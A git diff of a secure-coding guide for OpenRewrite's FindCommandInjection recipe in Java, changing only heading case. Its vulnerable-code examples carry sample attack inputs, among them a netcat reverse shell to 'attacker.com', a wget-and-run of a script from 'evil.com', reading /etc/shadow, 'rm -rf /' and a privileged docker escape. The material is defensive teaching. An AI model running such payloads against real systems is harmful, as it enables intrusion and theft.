@@ -6,11 +6,11 @@ description: Detect and prevent command injection vulnerabilities in Java applic
 
 Command injection vulnerabilities occur when untrusted data is passed to system commands, allowing attackers to execute arbitrary commands on the host operating system. This can lead to complete system compromise, data theft, or service disruption.
 
-## Understanding Command Injection
+## Understanding command injection
 
 Imagine giving someone remote control of your computer's command line. They could delete files, install malware, steal data, or shut down your system. Command injection vulnerabilities provide exactly this level of access to attackers through your application.
 
-### The Danger Illustrated
+### The danger illustrated
 
 ```java
 // VULNERABLE: User input directly in command
@@ -22,11 +22,11 @@ Process p = Runtime.getRuntime().exec("cat /logs/" + filename);
 // Result: Attempts to delete everything!
 ```
 
-## How OpenRewrite Detects Command Injection
+## How OpenRewrite detects command injection
 
 The `FindCommandInjection` recipe tracks untrusted data flowing into command execution methods:
 
-### 1. Command Execution Sinks
+### 1. Command execution sinks
 
 ```java
 // Runtime execution
@@ -43,7 +43,7 @@ DefaultExecutor executor = new DefaultExecutor()
 executor.execute(cmdLine)
 ```
 
-### 2. Common Attack Vectors
+### 2. Common attack vectors
 
 ```java
 // Shell metacharacters that enable command chaining
@@ -57,9 +57,9 @@ executor.execute(cmdLine)
 "`rm -rf /`"                          // Backtick execution
 ```
 
-## Vulnerable Patterns
+## Vulnerable patterns
 
-### Basic Command Injection
+### Basic command injection
 
 ```java
 // VULNERABLE - Direct concatenation
@@ -72,7 +72,7 @@ public String backup(@RequestParam String directory) {
 // Attack: directory = "/home/user; cat /etc/shadow > public/passwords.txt"
 ```
 
-### Array-Based Commands (Still Vulnerable)
+### Array-based commands (still vulnerable)
 
 ```java
 // VULNERABLE - Even with array syntax
@@ -85,7 +85,7 @@ public String ping(@RequestParam String host) {
 // Attack: host = "google.com; nc -e /bin/sh attacker.com 4444"
 ```
 
-### ProcessBuilder Vulnerabilities
+### ProcessBuilder vulnerabilities
 
 ```java
 // VULNERABLE - ProcessBuilder with shell
@@ -98,7 +98,7 @@ public void convertFile(@RequestParam String input, @RequestParam String output)
 // Attack: input = "video.mp4; wget evil.com/malware.sh; sh malware.sh;"
 ```
 
-### Path Traversal in Commands
+### Path traversal in commands
 
 ```java
 // VULNERABLE - Path traversal + command injection
@@ -111,9 +111,9 @@ public String viewLog(@RequestParam String logfile) {
 // Attack: logfile = "../../../etc/passwd; echo 'hacked' > /var/www/index.html"
 ```
 
-## Safe Patterns and Remediation
+## Safe patterns and remediation
 
-### Avoid Shell Invocation
+### Avoid shell invocation
 
 The safest approach is to avoid shell interpretation entirely.
 ```java
@@ -148,7 +148,7 @@ public void compressFile(@RequestParam String filename) {
 }
 ```
 
-### Input Validation and Sanitization
+### Input validation and sanitization
 
 When shell execution is unavoidable, strictly validate input.
 ```java
@@ -180,7 +180,7 @@ public class CommandSanitizer {
 }
 ```
 
-### Use Higher-Level APIs
+### Use higher-level APIs
 
 Prefer Java APIs over system commands.
 ```java
@@ -203,7 +203,7 @@ Files.walk(Paths.get(dir))
      .collect(Collectors.toList());
 ```
 
-### Parameterized Commands
+### Parameterized commands
 
 When external commands are necessary, use parameterization.
 ```java
@@ -242,9 +242,9 @@ public class SafeCommandExecutor {
 }
 ```
 
-## Advanced Detection Features
+## Advanced detection features
 
-### Context-Aware Analysis
+### Context-aware analysis
 
 The recipe considers how data flows through the program.
 ```java
@@ -264,7 +264,7 @@ private String buildCommand(String input) {
 }
 ```
 
-### Detecting Laundered Input
+### Detecting laundered input
 
 Even "cleaned" input might still be dangerous.
 ```java
@@ -280,9 +280,9 @@ public void execute(String userInput) {
 }
 ```
 
-## Platform-Specific Considerations
+## Platform-specific considerations
 
-### Windows vs. Unix Commands
+### Windows vs. Unix commands
 
 Different platforms have different dangerous characters.
 ```java
@@ -299,7 +299,7 @@ public class PlatformAwareValidator {
 }
 ```
 
-### Docker and Container Commands
+### Docker and container commands
 
 Special care with container orchestration.
 ```java
@@ -312,9 +312,9 @@ public void runContainer(@RequestParam String image, @RequestParam String cmd) {
 // Attack: image = "ubuntu; docker run -v /:/host --privileged ubuntu sh -c 'cat /host/etc/shadow'"
 ```
 
-## Testing Command Injection Detection
+## Testing command injection detection
 
-### Unit Tests
+### Unit tests
 
 ```java
 @Test
@@ -365,9 +365,9 @@ void detectsProcessBuilderInjection() {
 }
 ```
 
-## Common False Positives
+## Common false positives
 
-### Environment Variables
+### Environment variables
 
 ```java
 // May be flagged but could be safe if properly controlled
@@ -379,7 +379,7 @@ Path javaPath = Paths.get(System.getenv("JAVA_HOME"), "bin", "java");
 Process p = Runtime.getRuntime().exec(new String[]{javaPath.toString(), "-version"});
 ```
 
-### Configuration-Based Commands
+### Configuration-based commands
 
 ```java
 // From trusted configuration file
@@ -392,7 +392,7 @@ public void runBackup() {
 }
 ```
 
-## Severity and Impact
+## Severity and impact
 
 Command injection is typically a **CRITICAL** severity vulnerability because:
 
@@ -402,7 +402,7 @@ Command injection is typically a **CRITICAL** severity vulnerability because:
 4. **Lateral Movement**: Pivot point for attacking other systems
 5. **Privilege Escalation**: Potential to exploit SUID binaries or misconfigurations
 
-## Real-World Examples
+## Real-world examples
 
 Several major vulnerabilities have been command injection:
 
@@ -412,7 +412,7 @@ Several major vulnerabilities have been command injection:
 
 ## Integration with CI/CD
 
-### Pre-commit Hook
+### Pre-commit hook
 
 ```bash
 #!/bin/bash
@@ -427,7 +427,7 @@ if [ $? -ne 0 ]; then
 fi
 ```
 
-## Next Steps
+## Next steps
 
 - [SQL Injection](sql-injection.md) - Similar pattern for database commands
 - [LDAP Injection](ldap-injection.md) - Directory service command injection
